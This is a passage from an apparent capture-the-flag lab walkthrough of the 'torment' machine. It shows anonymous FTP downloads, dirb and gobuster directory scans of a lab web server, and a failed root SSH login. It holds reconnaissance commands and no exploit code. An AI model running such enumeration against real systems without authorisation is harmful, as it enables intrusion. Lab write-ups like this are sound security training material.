local: dpkg.status.3.gz remote: dpkg.status.3.gz
229 Entering Extended Passive Mode (|||48690|)
150 Opening BINARY mode data connection for dpkg.status.3.gz (492279 bytes).
100% |**********************************************************************|   480 KiB  213.00 MiB/s    00:00 ETA
226 Transfer complete.
492279 bytes received in 00:00 (191.46 MiB/s)
local: dpkg.status.4.gz remote: dpkg.status.4.gz
229 Entering Extended Passive Mode (|||47379|)
150 Opening BINARY mode data connection for dpkg.status.4.gz (492279 bytes).
100% |**********************************************************************|   480 KiB  297.88 MiB/s    00:00 ETA
226 Transfer complete.
492279 bytes received in 00:00 (267.50 MiB/s)
local: dpkg.status.5.gz remote: dpkg.status.5.gz
229 Entering Extended Passive Mode (|||43762|)
150 Opening BINARY mode data connection for dpkg.status.5.gz (489389 bytes).
100% |**********************************************************************|   477 KiB  287.20 MiB/s    00:00 ETA
226 Transfer complete.
489389 bytes received in 00:00 (198.51 MiB/s)
local: dpkg.status.6.gz remote: dpkg.status.6.gz
229 Entering Extended Passive Mode (|||46380|)
150 Opening BINARY mode data connection for dpkg.status.6.gz (470278 bytes).
100% |**********************************************************************|   459 KiB  251.82 MiB/s    00:00 ETA
226 Transfer complete.
470278 bytes received in 00:00 (219.20 MiB/s)
ftp&gt; mget *.0
local: alternatives.tar.0 remote: alternatives.tar.0
229 Entering Extended Passive Mode (|||41394|)
150 Opening BINARY mode data connection for alternatives.tar.0 (112640 bytes).
100% |**********************************************************************|   110 KiB  414.75 MiB/s    00:00 ETA
226 Transfer complete.
112640 bytes received in 00:00 (208.18 MiB/s)
local: apt.extended_states.0 remote: apt.extended_states.0
229 Entering Extended Passive Mode (|||41126|)
150 Opening BINARY mode data connection for apt.extended_states.0 (95760 bytes).
100% |**********************************************************************| 95760      129.90 MiB/s    00:00 ETA
226 Transfer complete.
95760 bytes received in 00:00 (81.83 MiB/s)
local: dpkg.diversions.0 remote: dpkg.diversions.0
229 Entering Extended Passive Mode (|||49509|)
150 Opening BINARY mode data connection for dpkg.diversions.0 (559 bytes).
100% |**********************************************************************|   559       11.10 MiB/s    00:00 ETA
226 Transfer complete.
559 bytes received in 00:00 (947.74 KiB/s)
local: dpkg.statoverride.0 remote: dpkg.statoverride.0
229 Entering Extended Passive Mode (|||40240|)
150 Opening BINARY mode data connection for dpkg.statoverride.0 (505 bytes).
100% |**********************************************************************|   505       13.75 MiB/s    00:00 ETA
226 Transfer complete.
505 bytes received in 00:00 (2.19 MiB/s)
local: dpkg.status.0 remote: dpkg.status.0
229 Entering Extended Passive Mode (|||40035|)
150 Opening BINARY mode data connection for dpkg.status.0 (1719127 bytes).
100% |**********************************************************************|  1678 KiB  334.86 MiB/s    00:00 ETA
226 Transfer complete.
1719127 bytes received in 00:00 (317.48 MiB/s)
ftp&gt; 
</code></pre>
<figure>
<img src="1.ftp.png" alt="" /><figcaption>1.ftp</figcaption>
</figure>
<figure>
<img src="2.fetched-ftp-files.png" alt="" /><figcaption>2.fetched-ftp-files</figcaption>
</figure>
<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
Wednesday 22 December 2021 10:21:20 AM IST 2021.12.22 10:21:20
f0c1s@kali:~/vuln-hubs/digitalworld.local/torment/ftp $
ls -la
total 4860
drwxr-xr-x 2 f0c1s f0c1s    4096 Dec 22 10:19 .
drwxr-xr-x 3 f0c1s f0c1s    4096 Dec 22 10:16 ..
-rw-r--r-- 1 f0c1s f0c1s  112640 Dec 28  2018 alternatives.tar.0
-rw-r--r-- 1 f0c1s f0c1s    4984 Dec 24  2018 alternatives.tar.1.gz
-rw-r--r-- 1 f0c1s f0c1s   95760 Dec 28  2018 apt.extended_states.0
-rw-r--r-- 1 f0c1s f0c1s   10513 Dec 27  2018 apt.extended_states.1.gz
-rw-r--r-- 1 f0c1s f0c1s   10437 Dec 27  2018 apt.extended_states.2.gz
-rw-r--r-- 1 f0c1s f0c1s     559 Dec 24  2018 dpkg.diversions.0
-rw-r--r-- 1 f0c1s f0c1s     229 Dec 24  2018 dpkg.diversions.1.gz
-rw-r--r-- 1 f0c1s f0c1s     229 Dec 24  2018 dpkg.diversions.2.gz
-rw-r--r-- 1 f0c1s f0c1s     229 Dec 24  2018 dpkg.diversions.3.gz
-rw-r--r-- 1 f0c1s f0c1s     229 Dec 24  2018 dpkg.diversions.4.gz
-rw-r--r-- 1 f0c1s f0c1s     229 Dec 24  2018 dpkg.diversions.5.gz
-rw-r--r-- 1 f0c1s f0c1s     229 Dec 24  2018 dpkg.diversions.6.gz
-rw-r--r-- 1 f0c1s f0c1s     505 Dec 28  2018 dpkg.statoverride.0
-rw-r--r-- 1 f0c1s f0c1s     295 Dec 28  2018 dpkg.statoverride.1.gz
-rw-r--r-- 1 f0c1s f0c1s     295 Dec 28  2018 dpkg.statoverride.2.gz
-rw-r--r-- 1 f0c1s f0c1s     295 Dec 28  2018 dpkg.statoverride.3.gz
-rw-r--r-- 1 f0c1s f0c1s     295 Dec 28  2018 dpkg.statoverride.4.gz
-rw-r--r-- 1 f0c1s f0c1s     281 Dec 27  2018 dpkg.statoverride.5.gz
-rw-r--r-- 1 f0c1s f0c1s     208 Dec 24  2018 dpkg.statoverride.6.gz
-rw-r--r-- 1 f0c1s f0c1s 1719127 Jan  1  2019 dpkg.status.0
-rw-r--r-- 1 f0c1s f0c1s  493252 Jan  1  2019 dpkg.status.1.gz
-rw-r--r-- 1 f0c1s f0c1s  493252 Jan  1  2019 dpkg.status.2.gz
-rw-r--r-- 1 f0c1s f0c1s  492279 Dec 28  2018 dpkg.status.3.gz
-rw-r--r-- 1 f0c1s f0c1s  492279 Dec 28  2018 dpkg.status.4.gz
-rw-r--r-- 1 f0c1s f0c1s  489389 Dec 28  2018 dpkg.status.5.gz
-rw-r--r-- 1 f0c1s f0c1s  470278 Dec 27  2018 dpkg.status.6.gz</code></pre>
<h2 id="dirb">dirb</h2>
<pre class="shell"><code>dirb http://$RHOST -o dirb.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: dirb.txt
START_TIME: Wed Dec 22 11:03:23 2021
URL_BASE: http://192.168.56.77/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.77/ ----
+ http://192.168.56.77/index.html (CODE:200|SIZE:10701)                                                                                                                                                                                   
==&gt; DIRECTORY: http://192.168.56.77/manual/                                                                                                                                                                                               
+ http://192.168.56.77/secret (CODE:200|SIZE:61)                                                                                                                                                                                          
+ http://192.168.56.77/server-status (CODE:403|SIZE:292)                                                                                                                                                                                  
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/ ----
==&gt; DIRECTORY: http://192.168.56.77/manual/da/                                                                                                                                                                                            
==&gt; DIRECTORY: http://192.168.56.77/manual/de/                                                                                                                                                                                            
==&gt; DIRECTORY: http://192.168.56.77/manual/en/                                                                                                                                                                                            
==&gt; DIRECTORY: http://192.168.56.77/manual/es/                                                                                                                                                                                            
==&gt; DIRECTORY: http://192.168.56.77/manual/fr/                                                                                                                                                                                            
==&gt; DIRECTORY: http://192.168.56.77/manual/images/                                                                                                                                                                                        
+ http://192.168.56.77/manual/index.html (CODE:200|SIZE:626)                                                                                                                                                                              
==&gt; DIRECTORY: http://192.168.56.77/manual/ja/                                                                                                                                                                                            
==&gt; DIRECTORY: http://192.168.56.77/manual/ko/                                                                                                                                                                                            
==&gt; DIRECTORY: http://192.168.56.77/manual/style/                                                                                                                                                                                         
==&gt; DIRECTORY: http://192.168.56.77/manual/tr/                                                                                                                                                                                            
==&gt; DIRECTORY: http://192.168.56.77/manual/zh-cn/                                                                                                                                                                                         
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/da/ ----
==&gt; DIRECTORY: http://192.168.56.77/manual/da/developer/                                                                                                                                                                                  
==&gt; DIRECTORY: http://192.168.56.77/manual/da/faq/                                                                                                                                                                                        
==&gt; DIRECTORY: http://192.168.56.77/manual/da/howto/                                                                                                                                                                                      
+ http://192.168.56.77/manual/da/index.html (CODE:200|SIZE:9117)                                                                                                                                                                          
==&gt; DIRECTORY: http://192.168.56.77/manual/da/misc/                                                                                                                                                                                       
==&gt; DIRECTORY: http://192.168.56.77/manual/da/mod/                                                                                                                                                                                        
==&gt; DIRECTORY: http://192.168.56.77/manual/da/programs/                                                                                                                                                                                   
==&gt; DIRECTORY: http://192.168.56.77/manual/da/ssl/                                                                                                                                                                                        
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/de/ ----
==&gt; DIRECTORY: http://192.168.56.77/manual/de/developer/                                                                                                                                                                                  
==&gt; DIRECTORY: http://192.168.56.77/manual/de/faq/                                                                                                                                                                                        
==&gt; DIRECTORY: http://192.168.56.77/manual/de/howto/                                                                                                                                                                                      
+ http://192.168.56.77/manual/de/index.html (CODE:200|SIZE:9544)                                                                                                                                                                          
==&gt; DIRECTORY: http://192.168.56.77/manual/de/misc/                                                                                                                                                                                       
==&gt; DIRECTORY: http://192.168.56.77/manual/de/mod/                                                                                                                                                                                        
==&gt; DIRECTORY: http://192.168.56.77/manual/de/programs/                                                                                                                                                                                   
==&gt; DIRECTORY: http://192.168.56.77/manual/de/ssl/                                                                                                                                                                                        
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/en/ ----
==&gt; DIRECTORY: http://192.168.56.77/manual/en/developer/                                                                                                                                                                                  
==&gt; DIRECTORY: http://192.168.56.77/manual/en/faq/                                                                                                                                                                                        
==&gt; DIRECTORY: http://192.168.56.77/manual/en/howto/                                                                                                                                                                                      
+ http://192.168.56.77/manual/en/index.html (CODE:200|SIZE:9352)                                                                                                                                                                          
==&gt; DIRECTORY: http://192.168.56.77/manual/en/misc/                                                                                                                                                                                       
==&gt; DIRECTORY: http://192.168.56.77/manual/en/mod/                                                                                                                                                                                        
==&gt; DIRECTORY: http://192.168.56.77/manual/en/programs/                                                                                                                                                                                   
==&gt; DIRECTORY: http://192.168.56.77/manual/en/ssl/                                                                                                                                                                                        
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/es/ ----
==&gt; DIRECTORY: http://192.168.56.77/manual/es/developer/                                                                                                                                                                                  
==&gt; DIRECTORY: http://192.168.56.77/manual/es/faq/                                                                                                                                                                                        
==&gt; DIRECTORY: http://192.168.56.77/manual/es/howto/                                                                                                                                                                                      
+ http://192.168.56.77/manual/es/index.html (CODE:200|SIZE:9810)                                                                                                                                                                          
==&gt; DIRECTORY: http://192.168.56.77/manual/es/misc/                                                                                                                                                                                       
==&gt; DIRECTORY: http://192.168.56.77/manual/es/mod/                                                                                                                                                                                        
==&gt; DIRECTORY: http://192.168.56.77/manual/es/programs/                                                                                                                                                                                   
==&gt; DIRECTORY: http://192.168.56.77/manual/es/ssl/                                                                                                                                                                                        
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/fr/ ----
==&gt; DIRECTORY: http://192.168.56.77/manual/fr/developer/                                                                                                                                                                                  
==&gt; DIRECTORY: http://192.168.56.77/manual/fr/faq/                                                                                                                                                                                        
==&gt; DIRECTORY: http://192.168.56.77/manual/fr/howto/                                                                                                                                                                                      
+ http://192.168.56.77/manual/fr/index.html (CODE:200|SIZE:9655)                                                                                                                                                                          
==&gt; DIRECTORY: http://192.168.56.77/manual/fr/misc/                                                                                                                                                                                       
==&gt; DIRECTORY: http://192.168.56.77/manual/fr/mod/                                                                                                                                                                                        
==&gt; DIRECTORY: http://192.168.56.77/manual/fr/programs/                                                                                                                                                                                   
==&gt; DIRECTORY: http://192.168.56.77/manual/fr/ssl/                                                                                                                                                                                        
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode &#39;-w&#39; if you want to scan it anyway)
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/ja/ ----
==&gt; DIRECTORY: http://192.168.56.77/manual/ja/developer/                                                                                                                                                                                  
==&gt; DIRECTORY: http://192.168.56.77/manual/ja/faq/                                                                                                                                                                                        
==&gt; DIRECTORY: http://192.168.56.77/manual/ja/howto/                                                                                                                                                                                      
+ http://192.168.56.77/manual/ja/index.html (CODE:200|SIZE:9935)                                                                                                                                                                          
==&gt; DIRECTORY: http://192.168.56.77/manual/ja/misc/                                                                                                                                                                                       
==&gt; DIRECTORY: http://192.168.56.77/manual/ja/mod/                                                                                                                                                                                        
==&gt; DIRECTORY: http://192.168.56.77/manual/ja/programs/                                                                                                                                                                                   
==&gt; DIRECTORY: http://192.168.56.77/manual/ja/ssl/                                                                                                                                                                                        
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/ko/ ----
==&gt; DIRECTORY: http://192.168.56.77/manual/ko/developer/                                                                                                                                                                                  
==&gt; DIRECTORY: http://192.168.56.77/manual/ko/faq/                                                                                                                                                                                        
==&gt; DIRECTORY: http://192.168.56.77/manual/ko/howto/                                                                                                                                                                                      
+ http://192.168.56.77/manual/ko/index.html (CODE:200|SIZE:8585)                                                                                                                                                                          
==&gt; DIRECTORY: http://192.168.56.77/manual/ko/misc/                                                                                                                                                                                       
==&gt; DIRECTORY: http://192.168.56.77/manual/ko/mod/                                                                                                                                                                                        
==&gt; DIRECTORY: http://192.168.56.77/manual/ko/programs/                                                                                                                                                                                   
==&gt; DIRECTORY: http://192.168.56.77/manual/ko/ssl/                                                                                                                                                                                        
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/style/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode &#39;-w&#39; if you want to scan it anyway)
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/tr/ ----
==&gt; DIRECTORY: http://192.168.56.77/manual/tr/developer/                                                                                                                                                                                  
==&gt; DIRECTORY: http://192.168.56.77/manual/tr/faq/                                                                                                                                                                                        
==&gt; DIRECTORY: http://192.168.56.77/manual/tr/howto/                                                                                                                                                                                      
+ http://192.168.56.77/manual/tr/index.html (CODE:200|SIZE:9569)                                                                                                                                                                          
==&gt; DIRECTORY: http://192.168.56.77/manual/tr/misc/                                                                                                                                                                                       
==&gt; DIRECTORY: http://192.168.56.77/manual/tr/mod/                                                                                                                                                                                        
==&gt; DIRECTORY: http://192.168.56.77/manual/tr/programs/                                                                                                                                                                                   
==&gt; DIRECTORY: http://192.168.56.77/manual/tr/ssl/                                                                                                                                                                                        
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/zh-cn/ ----
==&gt; DIRECTORY: http://192.168.56.77/manual/zh-cn/developer/                                                                                                                                                                               
==&gt; DIRECTORY: http://192.168.56.77/manual/zh-cn/faq/                                                                                                                                                                                     
==&gt; DIRECTORY: http://192.168.56.77/manual/zh-cn/howto/                                                                                                                                                                                   
+ http://192.168.56.77/manual/zh-cn/index.html (CODE:200|SIZE:8955)                                                                                                                                                                       
==&gt; DIRECTORY: http://192.168.56.77/manual/zh-cn/misc/                                                                                                                                                                                    
==&gt; DIRECTORY: http://192.168.56.77/manual/zh-cn/mod/                                                                                                                                                                                     
==&gt; DIRECTORY: http://192.168.56.77/manual/zh-cn/programs/                                                                                                                                                                                
==&gt; DIRECTORY: http://192.168.56.77/manual/zh-cn/ssl/                                                                                                                                                                                     
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/da/developer/ ----
+ http://192.168.56.77/manual/da/developer/index.html (CODE:200|SIZE:6030)                                                                                                                                                                
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/da/faq/ ----
+ http://192.168.56.77/manual/da/faq/index.html (CODE:200|SIZE:3880)                                                                                                                                                                      
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/da/howto/ ----
+ http://192.168.56.77/manual/da/howto/index.html (CODE:200|SIZE:8186)                                                                                                                                                                    
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/da/misc/ ----
+ http://192.168.56.77/manual/da/misc/index.html (CODE:200|SIZE:5182)                                                                                                                                                                     
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/da/mod/ ----
+ http://192.168.56.77/manual/da/mod/index.html (CODE:200|SIZE:22915)                                                                                                                                                                     
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/da/programs/ ----
+ http://192.168.56.77/manual/da/programs/index.html (CODE:200|SIZE:6973)                                                                                                                                                                 
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/da/ssl/ ----
+ http://192.168.56.77/manual/da/ssl/index.html (CODE:200|SIZE:5125)                                                                                                                                                                      
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/de/developer/ ----
+ http://192.168.56.77/manual/de/developer/index.html (CODE:200|SIZE:6030)                                                                                                                                                                
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/de/faq/ ----
+ http://192.168.56.77/manual/de/faq/index.html (CODE:200|SIZE:3880)                                                                                                                                                                      
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/de/howto/ ----
+ http://192.168.56.77/manual/de/howto/index.html (CODE:200|SIZE:8186)                                                                                                                                                                    
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/de/misc/ ----
+ http://192.168.56.77/manual/de/misc/index.html (CODE:200|SIZE:5182)                                                                                                                                                                     
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/de/mod/ ----
+ http://192.168.56.77/manual/de/mod/index.html (CODE:200|SIZE:23107)                                                                                                                                                                     
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/de/programs/ ----
+ http://192.168.56.77/manual/de/programs/index.html (CODE:200|SIZE:6973)                                                                                                                                                                 
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/de/ssl/ ----
+ http://192.168.56.77/manual/de/ssl/index.html (CODE:200|SIZE:5125)                                                                                                                                                                      
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/en/developer/ ----
+ http://192.168.56.77/manual/en/developer/index.html (CODE:200|SIZE:6030)                                                                                                                                                                
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/en/faq/ ----
+ http://192.168.56.77/manual/en/faq/index.html (CODE:200|SIZE:3880)                                                                                                                                                                      
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/en/howto/ ----
+ http://192.168.56.77/manual/en/howto/index.html (CODE:200|SIZE:8186)                                                                                                                                                                    
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/en/misc/ ----
+ http://192.168.56.77/manual/en/misc/index.html (CODE:200|SIZE:5182)                                                                                                                                                                     
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/en/mod/ ----
+ http://192.168.56.77/manual/en/mod/index.html (CODE:200|SIZE:22915)                                                                                                                                                                     
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/en/programs/ ----
+ http://192.168.56.77/manual/en/programs/index.html (CODE:200|SIZE:6973)                                                                                                                                                                 
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/en/ssl/ ----
+ http://192.168.56.77/manual/en/ssl/index.html (CODE:200|SIZE:5125)                                                                                                                                                                      
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/es/developer/ ----
+ http://192.168.56.77/manual/es/developer/index.html (CODE:200|SIZE:6030)                                                                                                                                                                
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/es/faq/ ----
+ http://192.168.56.77/manual/es/faq/index.html (CODE:200|SIZE:3976)                                                                                                                                                                      
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/es/howto/ ----
+ http://192.168.56.77/manual/es/howto/index.html (CODE:200|SIZE:8186)                                                                                                                                                                    
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/es/misc/ ----
+ http://192.168.56.77/manual/es/misc/index.html (CODE:200|SIZE:5182)                                                                                                                                                                     
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/es/mod/ ----
+ http://192.168.56.77/manual/es/mod/index.html (CODE:200|SIZE:23281)                                                                                                                                                                     
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/es/programs/ ----
+ http://192.168.56.77/manual/es/programs/index.html (CODE:200|SIZE:7441)                                                                                                                                                                 
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/es/ssl/ ----
+ http://192.168.56.77/manual/es/ssl/index.html (CODE:200|SIZE:5125)                                                                                                                                                                      
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/fr/developer/ ----
+ http://192.168.56.77/manual/fr/developer/index.html (CODE:200|SIZE:6030)                                                                                                                                                                
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/fr/faq/ ----
+ http://192.168.56.77/manual/fr/faq/index.html (CODE:200|SIZE:3882)                                                                                                                                                                      
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/fr/howto/ ----
+ http://192.168.56.77/manual/fr/howto/index.html (CODE:200|SIZE:8556)                                                                                                                                                                    
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/fr/misc/ ----
+ http://192.168.56.77/manual/fr/misc/index.html (CODE:200|SIZE:5483)                                                                                                                                                                     
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/fr/mod/ ----
+ http://192.168.56.77/manual/fr/mod/index.html (CODE:200|SIZE:24849)                                                                                                                                                                     
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/fr/programs/ ----
+ http://192.168.56.77/manual/fr/programs/index.html (CODE:200|SIZE:7261)                                                                                                                                                                 
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/fr/ssl/ ----
+ http://192.168.56.77/manual/fr/ssl/index.html (CODE:200|SIZE:5267)                                                                                                                                                                      
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/ja/developer/ ----
+ http://192.168.56.77/manual/ja/developer/index.html (CODE:200|SIZE:6030)                                                                                                                                                                
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/ja/faq/ ----
+ http://192.168.56.77/manual/ja/faq/index.html (CODE:200|SIZE:3880)                                                                                                                                                                      
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/ja/howto/ ----
+ http://192.168.56.77/manual/ja/howto/index.html (CODE:200|SIZE:8009)                                                                                                                                                                    
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/ja/misc/ ----
+ http://192.168.56.77/manual/ja/misc/index.html (CODE:200|SIZE:5182)                                                                                                                                                                     
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/ja/mod/ ----
+ http://192.168.56.77/manual/ja/mod/index.html (CODE:200|SIZE:24217)                                                                                                                                                                     
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/ja/programs/ ----
+ http://192.168.56.77/manual/ja/programs/index.html (CODE:200|SIZE:6973)                                                                                                                                                                 
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/ja/ssl/ ----
+ http://192.168.56.77/manual/ja/ssl/index.html (CODE:200|SIZE:5345)                                                                                                                                                                      
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/ko/developer/ ----
+ http://192.168.56.77/manual/ko/developer/index.html (CODE:200|SIZE:6030)                                                                                                                                                                
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/ko/faq/ ----
+ http://192.168.56.77/manual/ko/faq/index.html (CODE:200|SIZE:3880)                                                                                                                                                                      
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/ko/howto/ ----
+ http://192.168.56.77/manual/ko/howto/index.html (CODE:200|SIZE:6445)                                                                                                                                                                    
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/ko/misc/ ----
+ http://192.168.56.77/manual/ko/misc/index.html (CODE:200|SIZE:5269)                                                                                                                                                                     
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/ko/mod/ ----
+ http://192.168.56.77/manual/ko/mod/index.html (CODE:200|SIZE:22347)                                                                                                                                                                     
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/ko/programs/ ----
+ http://192.168.56.77/manual/ko/programs/index.html (CODE:200|SIZE:5845)                                                                                                                                                                 
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/ko/ssl/ ----
+ http://192.168.56.77/manual/ko/ssl/index.html (CODE:200|SIZE:5125)                                                                                                                                                                      
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/tr/developer/ ----
+ http://192.168.56.77/manual/tr/developer/index.html (CODE:200|SIZE:6030)                                                                                                                                                                
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/tr/faq/ ----
+ http://192.168.56.77/manual/tr/faq/index.html (CODE:200|SIZE:3887)                                                                                                                                                                      
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/tr/howto/ ----
+ http://192.168.56.77/manual/tr/howto/index.html (CODE:200|SIZE:8186)                                                                                                                                                                    
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/tr/misc/ ----
+ http://192.168.56.77/manual/tr/misc/index.html (CODE:200|SIZE:5410)                                                                                                                                                                     
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/tr/mod/ ----
+ http://192.168.56.77/manual/tr/mod/index.html (CODE:200|SIZE:23193)                                                                                                                                                                     
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/tr/programs/ ----
+ http://192.168.56.77/manual/tr/programs/index.html (CODE:200|SIZE:7476)                                                                                                                                                                 
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/tr/ssl/ ----
+ http://192.168.56.77/manual/tr/ssl/index.html (CODE:200|SIZE:5267)                                                                                                                                                                      
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/zh-cn/developer/ ----
+ http://192.168.56.77/manual/zh-cn/developer/index.html (CODE:200|SIZE:6066)                                                                                                                                                             
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/zh-cn/faq/ ----
+ http://192.168.56.77/manual/zh-cn/faq/index.html (CODE:200|SIZE:3846)                                                                                                                                                                   
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/zh-cn/howto/ ----
+ http://192.168.56.77/manual/zh-cn/howto/index.html (CODE:200|SIZE:6637)                                                                                                                                                                 
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/zh-cn/misc/ ----
+ http://192.168.56.77/manual/zh-cn/misc/index.html (CODE:200|SIZE:4878)                                                                                                                                                                  
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/zh-cn/mod/ ----
+ http://192.168.56.77/manual/zh-cn/mod/index.html (CODE:200|SIZE:22794)                                                                                                                                                                  
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/zh-cn/programs/ ----
+ http://192.168.56.77/manual/zh-cn/programs/index.html (CODE:200|SIZE:6904)                                                                                                                                                              
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.56.77/manual/zh-cn/ssl/ ----
+ http://192.168.56.77/manual/zh-cn/ssl/index.html (CODE:200|SIZE:5113)                                                                                                                                                                   
                                                                                                                                                                                                                                          
-----------------
END_TIME: Wed Dec 22 11:06:09 2021
DOWNLOADED: 341288 - FOUND: 76</code></pre>
<h2 id="browsing-web">Browsing web</h2>
<h3 id="http192.168.56.77manualenindex.html"><code>http://192.168.56.77/manual/en/index.html</code></h3>
<figure>
<img src="6.index.png" alt="" /><figcaption>6.index</figcaption>
</figure>
<h3 id="browsing-secret">Browsing /secret</h3>
<figure>
<img src="3.sufferance-or-pain.png" alt="" /><figcaption>3.sufferance-or-pain</figcaption>
</figure>
<h3 id="http192.168.56.77manualenprogramsindex.html"><code>http://192.168.56.77/manual/en/programs/index.html</code></h3>
<figure>
<img src="4.suexec-seems%20interesting.png" alt="" /><figcaption>4.suexec-seems interesting</figcaption>
</figure>
<figure>
<img src="5.suexec.png" alt="" /><figcaption>5.suexec</figcaption>
</figure>
<h2 id="gobuster">gobuster</h2>
<p><a href="http://blog.f0c1s.com/sec/tools/gobuster/gobuster.html">Checkout gobuster</a></p>
<pre class="shell"><code>gobuster dir --url http://$RHOST -x cgi,php,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -b 404,403 -q 
/manual               (Status: 301) [Size: 306] [--&gt; http://192.168.56.77/manual/]
/secret               (Status: 200) [Size: 61]</code></pre>
<pre class="shell"><code>gobuster dir --url http://$RHOST --wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -b 404,403 -q    
/index.html           (Status: 200) [Size: 10701]
/.                    (Status: 200) [Size: 10701]</code></pre>
<figure>
<img src="7.gobuster.png" alt="" /><figcaption>7.gobuster</figcaption>
</figure>
<h2 id="ssh">SSH</h2>
<pre class="shell"><code>ssh root@$RHOST                                                                
The authenticity of host &#39;192.168.56.77 (192.168.56.77)&#39; can&#39;t be established.
ED25519 key fingerprint is SHA256:saGAy7DktmEDsSDdp7nZm3zj+aIhdw5tMgGaNH+HGsQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added &#39;192.168.56.77&#39; (ED25519) to the list of known hosts.
root@192.168.56.77: Permission denied (publickey).</code></pre>
<p>Looks like I need a keyfile.</p>
